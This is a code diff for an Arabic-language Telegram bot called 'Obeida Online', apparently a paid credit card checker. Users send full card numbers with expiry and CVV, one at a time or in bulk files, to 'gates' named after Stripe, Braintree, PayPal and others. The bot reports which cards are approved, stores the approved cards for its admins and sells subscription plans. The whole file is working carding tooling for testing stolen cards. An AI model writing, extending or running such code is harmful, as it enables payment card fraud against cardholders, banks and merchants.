-            reply_markup=self.ui.stop_button(check_id)
-        )
-        
-        check_data['status_msg'] = status_msg
-        
-        results = {
-            'approved': [],
-            'declined': [],
-            'errors': []
-        }
-        
-        # فحص كل بطاقة
-        for i, card_data in enumerate(cards, 1):
-            # التحقق من إيقاف الفحص
-            if check_data['stop_flag']:
-                await bot.edit_message_text(
-                    f"⛔ <b>تم إيقاف الفحص بواسطة المستخدم</b>\n\n"
-                    f"تم فحص {i-1} من {len(cards)} بطاقة",
-                    status_msg.chat.id,
-                    status_msg.message_id,
-                    parse_mode='HTML'
-                )
-                break
-            
+        results = {'approved': 0, 'declined': 0}
+        for i, card in enumerate(cards, 1):
             try:
-                # تحديث الإحصائيات المباشرة
-                current_card = f"{card_data['number'][:6]}xxxxxx{card_data['number'][-4:]}"
-                self.live_stats[user_id]['current'] = current_card
-                
-                # تحديث رسالة الحالة
-                stats_text = Helpers.format_live_stats(
-                    len(cards),
-                    self.live_stats[user_id]['checked'],
-                    self.live_stats[user_id]['approved'],
-                    self.live_stats[user_id]['declined'],
-                    current_card
-                )
-                
+                stats['current'] = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
                 await bot.edit_message_text(
-                    f"🔄 <b>الفحص الجماعي</b>\n"
-                    f"🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}\n"
-                    f"{stats_text}",
-                    status_msg.chat.id,
-                    status_msg.message_id,
-                    parse_mode='HTML',
-                    reply_markup=self.ui.stop_button(check_id)
+                    f"🔄 {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'], stats['current'])}",
+                    stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML', reply_markup=self.ui.stop_button(check_id)
                 )
                 
-                # تنفيذ الفحص
-                result = await self.gateways.check_card(gate, card_data)
-                is_approved, response = result
-                
-                # تحديث الإحصائيات
-                self.live_stats[user_id]['checked'] += 1
-                if is_approved:
-                    self.live_stats[user_id]['approved'] += 1
+                approved, resp = await self.gateways.check_card(gate, card)
+                stats['checked'] += 1
+                if approved:
+                    stats['approved'] += 1
+                    results['approved'] += 1
+                    DataManager.save_approved_card(card['original'], GATES[gate]['name'], resp, uid)
                 else:
-                    self.live_stats[user_id]['declined'] += 1
+                    stats['declined'] += 1
+                    results['declined'] += 1
                 
-                # تحديث الإحصائيات العامة
-                DataManager.update_usage(user_id, gate, response)
-                
-                # حفظ النتيجة
-                card_str = card_data['original']
-                if is_approved:
-                    results['approved'].append((card_str, response))
-                    DataManager.save_approved_card(card_str, GATES[gate]['name'], response, user_id)
-                else:
-                    results['declined'].append((card_str, response))
-                
-                # إرسال النتيجة الفورية
-                result_text = self.ui.format_card_result(
-                    card_str,
-                    response,
-                    GATES[gate]['name'],
-                    is_approved
-                )
-                await bot.send_message(chat_id, result_text, parse_mode='HTML')
-                
-                # انتظار بين الفحوصات
+                DataManager.update_usage(uid, gate, resp)
+                await bot.send_message(cid, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML')
                 await asyncio.sleep(3)
-                
-            except Exception as e:
-                self.live_stats[user_id]['checked'] += 1
-                self.live_stats[user_id]['declined'] += 1
-                results['errors'].append((card_data['original'], str(e)[:50]))
-        
-        # إرسال التقرير النهائي إذا لم يتم الإيقاف
-        if not check_data['stop_flag']:
-            report = f"""
-📊 <b>تقرير الفحص الجماعي</b>
-━━━━━━━━━━━━━━━━
-🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}
-📊 إجمالي البطاقات: {len(cards)}
-
-✅ المقبولة: {len(results['approved'])}
-❌ المرفوضة: {len(results['declined'])}
-⚠️ الأخطاء: {len(results['errors'])}
-━━━━━━━━━━━━━━━━
-"""
-            
-            if results['approved']:
-                report += "\n✅ <b>البطاقات المقبولة:</b>\n"
-                for card, resp in results['approved'][:5]:
-                    masked = card.split('|')[0]
-                    masked = f"{masked[:6]}xxxxxx{masked[-4:]}"
-                    report += f"• <code>{masked}</code> - {resp}\n"
-                if len(results['approved']) > 5:
-                    report += f"  ... و {len(results['approved']) - 5} بطاقات أخرى\n"
-            
-            report += f"\n<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>"
-            
-            await bot.send_message(chat_id, report, parse_mode='HTML')
-            
-            # تحديث رسالة الحالة النهائية
-            final_stats = Helpers.format_live_stats(
-                len(cards),
-                self.live_stats[user_id]['checked'],
-                self.live_stats[user_id]['approved'],
-                self.live_stats[user_id]['declined'],
-                "اكتمل"
-            )
-            
-            await bot.edit_message_text(
-                f"✅ <b>اكتمل الفحص الجماعي</b>\n"
-                f"🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}\n"
-                f"{final_stats}",
-                status_msg.chat.id,
-                status_msg.message_id,
-                parse_mode='HTML'
-            )
-        
-        # تنظيف البيانات المؤقتة
-        del self.active_checks[check_id]
-        if user_id in self.live_stats:
-            del self.live_stats[user_id]
-    
-    def stop_mass_check(self, call, check_id: int):
-        """إيقاف الفحص الجماعي"""
-        check_data = self.active_checks.get(check_id)
-        if check_data:
-            check_data['stop_flag'] = True
-            bot.answer_callback_query(call.id, "⛔ جاري إيقاف الفحص...")
-        else:
-            bot.answer_callback_query(call.id, "❌ الفحص غير موجود")
-    
-    def process_add_subscription(self, message):
-        """معالجة إضافة اشتراك"""
-        user_id = message.from_user.id
-        if user_id not in ADMIN_IDS:
-            return
-        
-        try:
-            parts = message.text.strip().split()
-            if len(parts) != 2:
-                bot.reply_to(
-                    message,
-                    "❌ <b>صيغة غير صحيحة!</b>\n\n"
-                    "أرسل: <code>ايدي المدة</code>\n"
-                    "مثال: <code>123456789 30</code>",
-                    parse_mode='HTML'
-                )
-                return
-            
-            target_id = int(parts[0])
-            days = int(parts[1])
-            
-            if DataManager.add_subscription(target_id, "admin", days):
-                bot.reply_to(
-                    message,
-                    f"✅ <b>تم إضافة الاشتراك بنجاح</b>\n\n"
-                    f"👤 المستخدم: <code>{target_id}</code>\n"
-                    f"⏳ المدة: {days} يوم",
-                    parse_mode='HTML'
-                )
-                
-                # إرسال إشعار للمستخدم
-                try:
-                    markup = InlineKeyboardMarkup()
-                    markup.add(
-                        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
-                        InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
-                    )
-                    bot.send_message(
-                        target_id,
-                        f"✅ <b>تم تفعيل اشتراكك في بوت Obeida Online</b>\n\n"
-                        f"⏳ مدة الاشتراك: {days} يوم\n"
-                        f"📢 القناة: {CHANNEL_USERNAME}\n"
-                        f"👨‍💻 المطور: {DEV_CONTACT}\n\n"
-                        f"شكراً لاستخدامك بوتنا!",
-                        parse_mode='HTML',
-                        reply_markup=markup
-                    )
-                except:
-                    pass
-            else:
-                bot.reply_to(message, "❌ فشل في إضافة الاشتراك", parse_mode='HTML')
-                
-        except ValueError:
-            bot.reply_to(
-                message,
-                "❌ <b>معرف المستخدم أو المدة غير صحيح</b>",
-                parse_mode='HTML'
-            )
-        except Exception as e:
-            bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}")
-    
-    def process_remove_subscription(self, message):
-        """معالجة إزالة اشتراك"""
-        user_id = message.from_user.id
-        if user_id not in ADMIN_IDS:
-            return
-        
-        try:
-            target_id = int(message.text.strip())
-            
-            if DataManager.remove_subscription(target_id):
-                bot.reply_to(
-                    message,
-                    f"✅ <b>تم إزالة اشتراك المستخدم</b>\n<code>{target_id}</code>",
-                    parse_mode='HTML'
-                )
-                
-                # إرسال إشعار للمستخدم
-                try:
-                    bot.send_message(
-                        target_id,
-                        f"⚠️ <b>تم إلغاء اشتراكك في بوت Obeida Online</b>\n\n"
-                        f"لتجديد الاشتراك، تواصل مع المطور:\n{DEV_CONTACT}",
-                        parse_mode='HTML'
-                    )
-                except:
-                    pass
-            else:
-                bot.reply_to(message, "❌ المستخدم غير موجود", parse_mode='HTML')
-                
-        except ValueError:
-            bot.reply_to(
-                message,
-                "❌ <b>معرف المستخدم غير صحيح</b>",
-                parse_mode='HTML'
-            )
-    
-    def process_broadcast(self, message):
-        """معالجة إرسال إشعار لجميع المستخدمين"""
-        user_id = message.from_user.id
-        if user_id not in ADMIN_IDS:
-            return
-        
-        broadcast_text = message.text
-        users = DataManager.load_users()
-        
-        status_msg = bot.reply_to(
-            message,
-            f"📢 <b>جاري إرسال الإشعار...</b>\n"
-            f"👥 عدد المستخدمين: {len(users)}",
-            parse_mode='HTML'
-        )
-        
-        success = 0
-        failed = 0
-        
-        for uid in users.keys():
-            try:
-                markup = InlineKeyboardMarkup()
-                markup.add(
-                    InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
-                    InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
-                )
-                bot.send_message(
-                    int(uid),
-                    f"📢 <b>إشعار من المشرف</b>\n\n{broadcast_text}\n\n"
-                    f"<b>Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>",
-                    parse_mode='HTML',
-                    reply_markup=markup
-                )
-                success += 1
-                time.sleep(0.05)  # تجنب سبام
             except:
-                failed += 1
+                stats['checked'] += 1
+                stats['declined'] += 1
         
-        bot.edit_message_text(
-            f"✅ <b>تم إرسال الإشعار</b>\n\n"
-            f"✓ تم الإرسال: {success}\n"
-            f"✗ فشل: {failed}",
-            status_msg.chat.id,
-            status_msg.message_id,
-            parse_mode='HTML'
-        )
+        await bot.edit_message_text(f"✅ اكتمل\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}",
+                                    stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML')
+        del self.active_checks[check_id]
+        del self.live_stats[uid]
     
-    def handle_document(self, message):
-        """معالج الملفات المرفوعة"""
-        self.handle_mass_check(message)
+    def stop_check(self, call, check_id):
+        if check_id in self.active_checks:
+            self.active_checks[check_id]['stop'] = True
+            bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")
     
-    def handle_text(self, message):
-        """معالج النصوص العادية"""
-        text = message.text.strip()
-        
-        # التحقق إذا كان النص قد يكون بطاقة
-        if '|' in text:
-            card_data = Helpers.parse_card(text)
-            if card_data:
-                # اقتراح بوابات للفحص
-                markup = InlineKeyboardMarkup(row_width=2)
-                for gate_id, gate_info in GATES.items():
-                    if gate_info.get("enabled", True):
-                        markup.add(InlineKeyboardButton(
-                            f"{gate_info['icon']} فحص عبر {gate_info['name']}",
-                            callback_data=f"quick_{gate_id}_{message.message_id}"
-                        ))
-                
-                # تخزين البطاقة مؤقتاً
-                self.active_checks[message.message_id] = {
-                    'card': card_data,
-                    'user_id': message.from_user.id
-                }
-                
-                bin_info = Helpers.get_bin_info(card_data['number'][:6])
-                
-                bot.reply_to(
-                    message,
-                    f"💳 <b>تم التعرف على بطاقة</b>\n\n"
-                    f"<code>{card_data['number'][:6]}xxxxxx{card_data['number'][-4:]}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}</code>\n\n"
-                    f"🏦 <b>معلومات BIN:</b>\n"
-                    f"• النوع: {bin_info['brand']} | {bin_info['type']}\n"
-                    f"• البنك: {bin_info['bank']}\n"
-                    f"• الدولة: {bin_info['country']} {bin_info['flag']}\n\n"
-                    f"🚪 <b>اختر البوابة للفحص:</b>",
-                    parse_mode='HTML',
-                    reply_markup=markup
-                )
-                return
-        
-        # إذا كان النص غير معروف
-        bot.reply_to(
-            message,
-            "⚠️ <b>أمر غير معروف</b>\n\n"
-            "استخدم /start لعرض القائمة الرئيسية\n"
-            "أو /help لعرض المساعدة",
-            parse_mode='HTML'
-        )
-    
-    def show_approved_cards(self, call):
-        """عرض البطاقات المقبولة للمشرف"""
-        user_id = call.from_user.id
-        if user_id not in ADMIN_IDS:
-            bot.answer_callback_query(call.id, "⛔ هذا الأمر للمشرفين فقط")
-            return
-        
+    def add_sub(self, message):
+        if message.from_user.id not in ADMIN_IDS: return
         try:
-            if os.path.exists(APPROVED_CARDS_FILE):
-                with open(APPROVED_CARDS_FILE, 'r', encoding='utf-8') as f:
-                    content = f.read()
-                
-                if content.strip():
-                    # تقسيم المحتوى إذا كان طويلاً
-                    if len(content) > 4000:
-                        parts = [content[i:i+4000] for i in range(0, len(content), 4000)]
-                        for i, part in enumerate(parts):
-                            bot.send_message(
-                                call.message.chat.id,
-                                f"📁 <b>البطاقات المقبولة (جزء {i+1}/{len(parts)}):</b>\n\n<code>{part}</code>",
-                                parse_mode='HTML'
-                            )
-                    else:
-                        bot.send_message(
-                            call.message.chat.id,
-                            f"📁 <b>البطاقات المقبولة:</b>\n\n<code>{content}</code>",
-                            parse_mode='HTML'
-                        )
-                else:
-                    bot.send_message(
-                        call.message.chat.id,
-                        "📁 <b>لا توجد بطاقات مقبولة حتى الآن</b>",
-                        parse_mode='HTML'
-                    )
+            uid, days = map(int, message.text.strip().split())
+            if DataManager.add_subscription(uid, days):
+                bot.reply_to(message, f"✅ تمت إضافة اشتراك {days} يوم للمستخدم {uid}")
             else:
-                bot.send_message(
-                    call.message.chat.id,
-                    "📁 <b>ملف البطاقات المقبولة غير موجود</b>",
-                    parse_mode='HTML'
-                )
-        except Exception as e:
-            bot.send_message(
-                call.message.chat.id,
-                f"⚠️ <b>خطأ في قراءة الملف:</b> {str(e)[:100]}",
-                parse_mode='HTML'
-            )
+                bot.reply_to(message, "❌ فشل")
+        except:
+            bot.reply_to(message, "❌ الصيغة: ايدي المدة")
+    
+    def remove_sub(self, message):
+        if message.from_user.id not in ADMIN_IDS: return
+        try:
+            uid = int(message.text.strip())
+            if DataManager.remove_subscription(uid):
+                bot.reply_to(message, f"✅ تم إزالة اشتراك {uid}")
+            else:
+                bot.reply_to(message, "❌ فشل")
+        except:
+            bot.reply_to(message, "❌ الصيغة: ايدي")
 
 # ==================== معالج الكول باك ====================
 class CallbackHandler:
-    """معالج أزرار الكول باك"""
+    def __init__(self, handler):
+        self.handler = handler
     
-    def __init__(self, cmd_handler: CommandHandler):
-        self.cmd_handler = cmd_handler
-    
-    def handle_callback(self, call):
-        """معالج الكول باك العام"""
+    def handle(self, call):
         data = call.data
-        user_id = call.from_user.id
+        uid = call.from_user.id
         
-        try:
-            if data == "back_main":
-                bot.edit_message_text(
-                    "✨ <b>القائمة الرئيسية</b>",
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.main_menu()
-                )
-            
-            elif data == "gates_menu":
-                bot.edit_message_text(
-                    "🚪 <b>اختر البوابة:</b>",
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.gates_menu()
-                )
-            
-            elif data == "my_profile":
-                self.cmd_handler.handle_my_stats(call)
-            
-            elif data == "my_stats":
-                self.cmd_handler.handle_my_stats(call)
-            
-            elif data == "global_stats":
-                self.cmd_handler.handle_global_stats(call)
-            
-            elif data == "stats":
-                self.cmd_handler.handle_global_stats(call)
-            
-            elif data == "subscribe":
-                plans_text = f"""
-💎 <b>خطط الاشتراك - Obeida Online</b>
-
-<b>📅 الخطط المتاحة:</b>
-• يومي: 5K ID
-• أسبوعي: 15K ID
-• شهري: 40K ID
-• 3 أشهر: 100K ID
-• 6 أشهر: 180K ID
-• سنوي: 300K ID
-
-للاشتراك، تواصل مع المطور:
-{DEV_CONTACT}
-
-أو اشترك عبر القناة:
-{CHANNEL_USERNAME}
-"""
-                bot.edit_message_text(
-                    plans_text,
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.subscription_plans()
-                )
-            
-            elif data.startswith("sub_"):
-                plan = data.replace("sub_", "")
-                sub_text = f"""
-✅ <b>طلب اشتراك</b>
-
-<b>الخطة:</b> {SUBSCRIPTION_PLANS[plan]['name']}
-<b>السعر:</b> {SUBSCRIPTION_PLANS[plan]['price']}
-
-للحصول على الاشتراك، يرجى التواصل مع المطور:
-{DEV_CONTACT}
-
-أو إرسال إثبات الدفع إلى المطور مباشرة.
-"""
-                bot.edit_message_text(
-                    sub_text,
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.back_button()
-                )
-            
-            elif data.startswith("select_gate_"):
-                gate = data.replace("select_gate_", "")
-                gate_info = GATES.get(gate, {})
-                bot.edit_message_text(
-                    f"✅ <b>تم اختيار: {gate_info['icon']} {gate_info['name']}</b>\n\n"
-                    f"📝 أرسل البطاقة بهذه الصيغة:\n"
-                    f"<code>/{gate_info['command']} رقم|شهر|سنة|cvv</code>\n\n"
-                    f"مثال:\n"
-                    f"<code>/{gate_info['command']} 4111111111111111|12|25|123</code>",
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.back_button("gates_menu")
-                )
-            
-            elif data.startswith("quick_"):
-                parts = data.split('_')
-                if len(parts) >= 3:
-                    gate = parts[1]
-                    msg_id = int(parts[2])
-                    
-                    check_data = self.cmd_handler.active_checks.get(msg_id)
-                    if check_data and 'card' in check_data:
-                        card_data = check_data['card']
-                        
-                        # تنفيذ الفحص
-                        loop = asyncio.new_event_loop()
-                        asyncio.set_event_loop(loop)
-                        result = loop.run_until_complete(
-                            self.cmd_handler.gateways.check_card(gate, card_data)
-                        )
-                        loop.close()
-                        
-                        is_approved, response = result
-                        
-                        # تحديث الإحصائيات
-                        DataManager.update_usage(user_id, gate, response)
-                        
-                        # حفظ البطاقة المقبولة
-                        if is_approved:
-                            DataManager.save_approved_card(
-                                card_data['original'],
-                                GATES[gate]['name'],
-                                response,
-                                user_id
-                            )
-                        
-                        # تنسيق النتيجة
-                        result_text = UserInterface.format_card_result(
-                            card_data['original'],
-                            response,
-                            GATES[gate]['name'],
-                            is_approved
-                        )
-                        
-                        bot.edit_message_text(
-                            result_text,
-                            call.message.chat.id,
-                            call.message.message_id,
-                            parse_mode='HTML'
-                        )
-                        
-                        # تنظيف البيانات المؤقتة
-                        del self.cmd_handler.active_checks[msg_id]
-                    else:
-                        bot.answer_callback_query(call.id, "❌ انتهت صلاحية الطلب")
-            
-            elif data.startswith("mass_"):
-                parts = data.split('_')
-                if len(parts) >= 3:
-                    gate = parts[1]
-                    check_id = int(parts[2])
-                    
-                    # تنفيذ الفحص الجماعي
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
-                    loop.run_until_complete(
-                        self.cmd_handler.process_mass_check(call, gate, check_id)
-                    )
-                    loop.close()
-                    
-                    bot.answer_callback_query(call.id, "✅ بدأ الفحص الجماعي")
-            
-            elif data.startswith("stop_check_"):
-                check_id = int(data.replace("stop_check_", ""))
-                self.cmd_handler.stop_mass_check(call, check_id)
-            
-            elif data == "mass_check":
-                bot.edit_message_text(
-                    "📁 <b>فحص ملف بطاقات</b>\n\n"
-                    "أرسل ملف txt يحتوي على البطاقات (واحدة في كل سطر)\n"
-                    "الصيغة: <code>رقم|شهر|سنة|cvv</code>",
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.back_button()
-                )
-            
-            elif data == "admin_menu" and user_id in ADMIN_IDS:
-                bot.edit_message_text(
-                    "👑 <b>قائمة المشرفين</b>",
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.admin_menu()
-                )
-            
-            elif data == "admin_users" and user_id in ADMIN_IDS:
-                users = DataManager.load_users()
-                users_text = "👥 <b>قائمة المستخدمين</b>\n\n"
-                
-                for uid, user_data in list(users.items())[:20]:
-                    name = user_data.get('first_name', 'Unknown')
-                    sub = user_data.get('subscription', {})
-                    sub_status = "✅" if sub.get('active') else "❌"
-                    checks = user_data.get('usage', {}).get('total_checks', 0)
-                    approved = user_data.get('usage', {}).get('approved', 0)
-                    
-                    users_text += f"{sub_status} <code>{uid}</code> - {name}\n"
-                    users_text += f"   📊 فحوصات: {checks} | ✅ {approved}\n\n"
-                
-                if len(users) > 20:
-                    users_text += f"\n... و {len(users) - 20} مستخدم آخر"
-                
-                # تقسيم النص إذا كان طويلاً
-                if len(users_text) > 4000:
-                    parts = [users_text[i:i+4000] for i in range(0, len(users_text), 4000)]
-                    for i, part in enumerate(parts):
-                        bot.send_message(
-                            call.message.chat.id,
-                            f"👥 <b>المستخدمين (جزء {i+1}/{len(parts)}):</b>\n\n{part}",
-                            parse_mode='HTML'
-                        )
-                    bot.delete_message(call.message.chat.id, call.message.message_id)
-                else:
-                    bot.edit_message_text(
-                        users_text,
-                        call.message.chat.id,
-                        call.message.message_id,
-                        parse_mode='HTML',
-                        reply_markup=UserInterface.back_button("admin_menu")
-                    )
-            
-            elif data == "admin_add_sub" and user_id in ADMIN_IDS:
-                msg = bot.send_message(
-                    call.message.chat.id,
-                    "➕ <b>إضافة اشتراك لمستخدم</b>\n\n"
-                    "أرسل معرف المستخدم والمدة بالأيام:\n"
-                    "<code>ايدي المدة</code>\n\n"
-                    "مثال: <code>123456789 30</code>",
-                    parse_mode='HTML'
-                )
-                bot.register_next_step_handler(msg, self.cmd_handler.process_add_subscription)
-            
-            elif data == "admin_remove_sub" and user_id in ADMIN_IDS:
-                msg = bot.send_message(
-                    call.message.chat.id,
-                    "➖ <b>إزالة اشتراك مستخدم</b>\n\n"
-                    "أرسل معرف المستخدم:\n"
-                    "<code>123456789</code>",
-                    parse_mode='HTML'
-                )
-                bot.register_next_step_handler(msg, self.cmd_handler.process_remove_subscription)
-            
-            elif data == "admin_stats" and user_id in ADMIN_IDS:
-                stats = DataManager.load_stats()
-                users = DataManager.load_users()
-                
-                # حساب متوسط الاستخدام
-                total_users = len(users)
-                active_subs = sum(1 for u in users.values() if u.get('subscription', {}).get('active'))
-                total_checks = stats.get('total_checks', 0)
-                
-                admin_stats = f"""
-👑 <b>إحصائيات المشرف</b>
-━━━━━━━━━━━━━━━━
-👥 إجمالي المستخدمين: {total_users}
-✅ المشتركين النشطين: {active_subs}
-📊 متوسط الفحوصات: {total_checks // max(total_users, 1)} لكل مستخدم
-
-<b>📊 إحصائيات البوت:</b>
-• إجمالي الفحوصات: {stats.get('total_checks', 0)}
-• البطاقات المقبولة: {stats.get('total_approved', 0)}
-• البطاقات المرفوضة: {stats.get('total_declined', 0)}
-• نسبة القبول: {(stats.get('total_approved', 0) / max(stats.get('total_checks', 1), 1) * 100):.1f}%
-
-<b>🚪 استخدام البوابات:</b>
-"""
-                for gate, count in stats.get('gates_usage', {}).items():
-                    gate_name = GATES.get(gate, {}).get('name', gate)
-                    icon = GATES.get(gate, {}).get('icon', '🚪')
-                    admin_stats += f"  {icon} {gate_name}: {count}\n"
-                
-                bot.edit_message_text(
-                    admin_stats,
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.back_button("admin_menu")
-                )
-            
-            elif data == "admin_broadcast" and user_id in ADMIN_IDS:
-                msg = bot.send_message(
-                    call.message.chat.id,
-                    "📢 <b>إرسال إشعار لجميع المستخدمين</b>\n\n"
-                    "أرسل النص الذي تريد نشره:",
-                    parse_mode='HTML'
-                )
-                bot.register_next_step_handler(msg, self.cmd_handler.process_broadcast)
-            
-            elif data == "admin_settings" and user_id in ADMIN_IDS:
-                settings_text = f"""
-⚙️ <b>إعدادات البوت</b>
-━━━━━━━━━━━━━━━━
-🤖 توكن البوت: {BOT_TOKEN[:10]}...{BOT_TOKEN[-10:]}
-👑 المشرفون: {', '.join(str(a) for a in ADMIN_IDS)}
-📢 القناة: {CHANNEL_USERNAME}
-👤 المطور: {DEV_CONTACT}
-📁 ملفات التخزين: {USERS_FILE}, {STATS_FILE}
-
-🚪 البوابات المفعلة:
-"""
-                for gate_id, gate_info in GATES.items():
-                    status = "✅" if gate_info.get('enabled', True) else "❌"
-                    settings_text += f"{status} {gate_info['icon']} {gate_info['name']}\n"
-                
-                bot.edit_message_text(
-                    settings_text,
-                    call.message.chat.id,
-                    call.message.message_id,
-                    parse_mode='HTML',
-                    reply_markup=UserInterface.back_button("admin_menu")
-                )
-            
-            elif data == "admin_approved" and user_id in ADMIN_IDS:
-                self.cmd_handler.show_approved_cards(call)
-                bot.answer_callback_query(call.id)
-            
+        if data == "back_main":
+            bot.edit_message_text("✨ القائمة الرئيسية", call.message.chat.id, call.message.message_id,
+                                 reply_markup=UserInterface.main_menu(), parse_mode='HTML')
+        elif data == "my_profile":
+            self.handler.handle_profile(call.message)
+        elif data == "stats":
+            self.handler.handle_stats(call.message)
+        elif data == "subscribe":
+            sub = DataManager.get_user_subscription(uid)
+            if sub:
+                bot.edit_message_text(f"💎 اشتراكك نشط حتى {sub.get('expiry','')[:10]}", call.message.chat.id, call.message.message_id,
+                                      reply_markup=UserInterface.back_button())
             else:
-                bot.answer_callback_query(call.id, "⚠️ أمر غير معروف")
-                
-        except Exception as e:
-            bot.answer_callback_query(call.id, f"⚠️ خطأ: {str(e)[:30]}")
+                plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
+                bot.edit_message_text(f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك: {DEV_CONTACT}", 
+                                      call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button())
+        elif data.startswith("gate_"):
+            gate = data.replace("gate_", "")
+            bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل: <code>/{GATES[gate]['command']} رقم|شهر|سنة|cvv</code>",
+                                  call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
+        elif data.startswith("mass_"):
+            parts = data.split('_')
+            if len(parts) >= 3:
+                gate, cid = parts[1], int(parts[2])
+                asyncio.run_coroutine_threadsafe(self.handler.process_mass(call, gate, cid), asyncio.new_event_loop())
+        elif data.startswith("stop_"):
+            cid = int(data.replace("stop_", ""))
+            self.handler.stop_check(call, cid)
 
-# ==================== إعداد البوت وتشغيله ====================
-def setup_bot():
-    """إعداد وتشغيل البوت"""
+# ==================== إعداد البوت ====================
+def setup():
+    for f in [USERS_FILE, APPROVED_CARDS_FILE, STATS_FILE]:
+        if not os.path.exists(f):
+            with open(f, 'w') as ff:
+                if f.endswith('.json'): json.dump({} if f!=STATS_FILE else {"total_checks":0}, ff)
+                else: ff.write("# Approved Cards\n")
     
-    # إنشاء الملفات الضرورية
-    for file in [USERS_FILE, APPROVED_CARDS_FILE, STATS_FILE]:
-        if not os.path.exists(file):
-            with open(file, 'w', encoding='utf-8') as f:
-                if file.endswith('.json'):
-                    json.dump({} if file != STATS_FILE else {
-                        "total_checks": 0,
-                        "total_approved": 0,
-                        "total_declined": 0,
-                        "gates_usage": {},
-                        "daily_stats": {},
-                        "last_reset": datetime.now().isoformat()
-                    }, f, indent=4)
-                else:
-                    f.write("# Obeida Online Approved Cards\n")
-    
-    # إنشاء معالجات
-    cmd_handler = CommandHandler()
-    callback_handler = CallbackHandler(cmd_handler)
-    
-    # ==================== أوامر البوت ====================
+    handler = CommandHandler()
+    callback = CallbackHandler(handler)
     
     @bot.message_handler(commands=['start'])
-    def start_command(message):
-        cmd_handler.handle_start(message)
+    def start(m): handler.handle_start(m)
     
     @bot.message_handler(commands=['help'])
-    def help_command(message):
-        cmd_handler.handle_help(message)
+    def help(m): handler.handle_help(m)
     
     @bot.message_handler(commands=['profile'])
-    def profile_command(message):
-        cmd_handler.handle_profile(message)
+    def profile(m): handler.handle_profile(m)
     
     @bot.message_handler(commands=['stats'])
-    def stats_command(message):
-        cmd_handler.handle_stats(message)
+    def stats(m): handler.handle_stats(m)
     
     @bot.message_handler(commands=['subscribe'])
-    def subscribe_command(message):
-        cmd_handler.handle_subscribe(message)
+    def sub(m): handler.handle_subscribe(m)
     
     @bot.message_handler(commands=['gates'])
-    def gates_command(message):
-        cmd_handler.handle_gates(message)
+    def gates(m): handler.handle_gates(m)
     
     @bot.message_handler(commands=['mass'])
-    def mass_command(message):
-        cmd_handler.handle_mass_check(message)
+    def mass(m): handler.handle_mass(m)
     
-    # أوامر البوابات
-    @bot.message_handler(commands=['braintree'])
-    def braintree_command(message):
-        cmd_handler.handle_single_check(message, 'braintree')
+    for g in GATES:
+        @bot.message_handler(commands=[g])
+        def wrapped(m, g=g): handler.handle_single(m, g)
     
-    @bot.message_handler(commands=['switchup'])
-    def switchup_command(message):
-        cmd_handler.handle_single_check(message, 'switchup')
-    
-    @bot.message_handler(commands=['stripe'])
-    def stripe_command(message):
-        cmd_handler.handle_single_check(message, 'stripe')
-    
-    @bot.message_handler(commands=['zendrop'])
-    def zendrop_command(message):
-        cmd_handler.handle_single_check(message, 'zendrop')
-    
-    @bot.message_handler(commands=['paypal'])
-    def paypal_command(message):
-        cmd_handler.handle_single_check(message, 'paypal')
-    
-    # أوامر المشرفين
     @bot.message_handler(commands=['admin'])
-    def admin_command(message):
-        if message.from_user.id in ADMIN_IDS:
-            bot.reply_to(
-                message,
-                "👑 <b>قائمة المشرفين</b>",
-                parse_mode='HTML',
-                reply_markup=UserInterface.admin_menu()
-            )
-        else:
-            bot.reply_to(message, "⛔ <b>هذا الأمر مخصص للمشرفين فقط</b>", parse_mode='HTML')
-    
-    # ==================== معالجات الوسائط ====================
+    def admin(m):
+        if m.from_user.id in ADMIN_IDS:
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("➕ إضافة اشتراك", callback_data="admin_add"),
+                      InlineKeyboardButton("➖ إزالة اشتراك", callback_data="admin_remove"))
+            bot.reply_to(m, "👑 قائمة المشرفين", reply_markup=markup)
     
     @bot.message_handler(content_types=['document'])
-    def handle_document(message):
-        cmd_handler.handle_document(message)
+    def doc(m): handler.handle_mass(m)
     
-    @bot.message_handler(func=lambda message: True)
-    def handle_text(message):
-        cmd_handler.handle_text(message)
